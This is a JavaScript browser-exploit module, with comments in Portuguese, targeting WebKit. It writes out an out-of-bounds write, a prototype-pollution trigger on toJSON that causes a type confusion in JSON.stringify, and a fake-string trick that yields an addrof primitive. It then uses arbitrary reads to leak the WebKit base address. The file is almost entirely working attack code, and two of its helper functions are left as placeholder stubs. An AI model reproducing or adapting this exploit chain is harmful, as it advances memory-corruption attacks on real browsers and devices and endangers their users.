// js/script3/testArrayBufferVictimCrash.mjs (R58 - All-In com Fake JSString)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE = "WebKit_Exploit_R58_AllInFakeString";

const PROBE_CALL_LIMIT_V82 = 10;
const OOB_OFFSET_FOR_TC_TRIGGER = 0x7C;
const OOB_VALUE_FOR_TC_TRIGGER = 0xABABABAB;

// Offsets para WebKit Leak
const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

// Assumindo que a primeira propriedade de um JSObject começa em 0x10 após o JSCell header.
// A propriedade 'target' do nosso objeto container estará neste offset.
const JSObject_first_prop_offset = new AdvancedInt64(0x10);

function isValidPointer(ptr, context = "") { /* ... (sem alteração) ... */ }
function safeToHex(value, length = 8) { /* ... (sem alteração) ... */ }

// Função para extrair o endereço de um JSON stringificado
function extractAddressFromLeakedString(leaky_str) {
    if (typeof leaky_str !== 'string' || leaky_str.length < 4) return null;
    logS3(`   Analisando string vazada para extrair endereço: "${leaky_str.substring(0,8)}..."`, "leak_detail");
    // O JSCell tem 8 bytes. Se a string for Unicode, cada char é 2 bytes.
    // Precisamos de 4 caracteres para obter o endereço de 64 bits.
    const low = (leaky_str.charCodeAt(1) << 16) | leaky_str.charCodeAt(0);
    const high = (leaky_str.charCodeAt(3) << 16) | leaky_str.charCodeAt(2);
    const potential_ptr = new AdvancedInt64(low, high);
    if (isValidPointer(potential_ptr, "_extractedAddr")) {
        return potential_ptr;
    }
    return null;
}


export async function executeTypedArrayVictimAddrofAndWebKitLeak_R58() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: All-In com Fake JSString ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init All-In...`;

    logS3(`--- Fase 0 (AllIn): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
    catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
    logS3(`Sanity Check: ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
    await PAUSE_S3(100);
    if (!coreOOBReadWriteOK) { return { errorOccurred: "OOB Sanity Check Failed" }; }

    let result = {
        errorOccurred: null,
        addrof_result: { success: false, msg: "Addrof (AllIn): Não obtido.", leaked_object_addr: null },
        webkit_leak_result: { success: false, msg: "WebKit Leak (AllIn): Não iniciado.", webkit_base_candidate: null },
    };

    try {
        let victim_ta_for_json_trigger = null;
        let m1_ref = null; 
        let m2_fake_string_ref = null; 
        let tc_detected = false;
        let stringify_result_raw = null;
        let target_function_for_addrof = function someUniqueLeakFunctionR58() {};

        // Para evitar desestabilizar a TC, criamos os objetos complexos *antes* de entrar na sonda.
        const obj_to_leak_addr = { target: target_function_for_addrof };

        // Criar o M2 para se parecer com um JSString.
        // A estrutura de um JSString é complexa. O mais importante são os campos length e m_data (ponteiro de dados).
        // Um objeto JS normal armazena suas propriedades em um 'butterfly' (ponteiro a 0x10).
        // Se a TC for profunda o suficiente, o motor pode tratar a primeira propriedade do butterfly como o 'length' e a segunda como 'm_data'.
        // Isso é altamente especulativo e depende do tipo de confusão.
        m2_fake_string_ref = {
            // Tentativa de alinhar com uma estrutura de string simples
            corrupted_length_prop: 8, // O comprimento da "string" que queremos ler (8 bytes = endereço de 64 bits)
            corrupted_data_ptr_prop: obj_to_leak_addr, // O objeto cujos primeiros 8 bytes queremos ler
            id: "M2_FakeString"
        };
        m1_ref = { id: "M1_FakeString", m2_payload: m2_fake_string_ref };

        const probe = () => {
            if (probe.calls === undefined) probe.calls = 0;
            probe.calls++;
            // A sonda agora é o mais simples possível para não perturbar a TC.
            if (probe.calls === 1) return m1_ref;
            if (probe.calls === 2 && this === m2_fake_string_ref) {
                tc_detected = true;
                return this;
            }
            return {};
        };
        
        victim_ta_for_json_trigger = new Uint32Array(8);
        
        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST_BASE}-OOBSetup` });
        oob_write_absolute(OOB_OFFSET_FOR_TC_TRIGGER, OOB_VALUE_FOR_TC_TRIGGER, 4);

        const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
        try {
            Object.defineProperty(Object.prototype, ppKey, { value: probe, writable: true, configurable: true, enumerable: false });
            polluted = true;
            stringify_result_raw = JSON.stringify(victim_ta_for_json_trigger);
        } finally { if (polluted) { if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey]; } }

        if (!tc_detected) throw new Error("Falha ao acionar a Confusão de Tipos. A base do exploit está instável.");
        
        logS3(`   JSON.stringify raw output: ${stringify_result_raw}`, "leak");
        // O resultado esperado é que JSON.stringify serialize o objeto m2_ref,
        // mas se a TC o tratar como string, a serialização da propriedade 'm2_payload' será diferente.
        let parsed_json = JSON.parse(stringify_result_raw);
        let leaky_prop_value = parsed_json?.m2_payload; // Acessar o objeto M2 serializado

        if (typeof leaky_prop_value !== 'string') {
            throw new Error(`A TC ocorreu, mas m2_payload não foi serializado como string. Tipo: ${typeof leaky_prop_value}. Conteúdo: ${JSON.stringify(leaky_prop_value)}`);
        }

        const leaked_addr_container = extractAddressFromLeakedString(leaky_prop_value);
        if (!isValidPointer(leaked_addr_container, "_leakedContainerAddr")) {
            throw new Error(`Falha ao extrair um endereço válido da string vazada: "${leaky_prop_value}"`);
        }
        
        logS3(`   !!! ADDROF(obj_to_leak_addr) = ${leaked_addr_container.toString(true)} !!!`, "success_major");
        
        const addr_of_target_func = await arb_read(leaked_addr_container.add(JSObject_first_prop_offset), 8);
        if (!isValidPointer(addr_of_target_func, "_addrOfTargetFuncFinal")) {
            throw new Error(`Ponteiro lido para target_function_for_addrof é inválido: ${safeToHex(addr_of_target_func)}`);
        }

        logS3(`   !!! ADDROF(target_function_for_addrof) = ${addr_of_target_func.toString(true)} !!!`, "success_major");
        result.addrof_result = { success: true, msg: "addrof obtido via Fake String e TC.", leaked_object_addr: addr_of_target_func.toString(true) };
        
        // Fase 2: WebKit Leak
        logS3(`--- Fase 2 (AllIn): Usando addrof para vazar a base do WebKit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        const ptr_exe = await arb_read(addr_of_target_func.add(FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
        if (!isValidPointer(ptr_exe, "_wkLeakExeAllIn")) throw new Error("Ponteiro para Executable inválido.");
        const ptr_jitvm = await arb_read(ptr_exe.add(EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM), 8);
        if (!isValidPointer(ptr_jitvm, "_wkLeakJitVmAllIn")) throw new Error("Ponteiro para JIT Code/VM inválido.");
        const webkit_base_candidate = ptr_jitvm.and(new AdvancedInt64(0x0, ~0xFFF));
        logS3(`   !!! ENDEREÇO BASE DO WEBKIT (CANDIDATO): ${webkit_base_candidate.toString(true)} !!!`, "success_major");

        result.webkit_leak_result = { success: true, msg: `WebKitLeak OK: ${webkit_base_candidate.toString(true)}`, webkit_base_candidate: webkit_base_candidate.toString(true) };
        document.title = `${FNAME_CURRENT_TEST_BASE} Final: WEBKIT_LEAK_OK!`;

    } catch(e) {
        logS3(`   ERRO na execução do exploit: ${e.message}`, "critical");
        result.errorOccurred = e.message;
        document.title = `${FNAME_CURRENT_TEST_BASE} Final: FAILED`;
    } finally {
        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST_BASE}-FinalClear` });
    }
    return result;
}
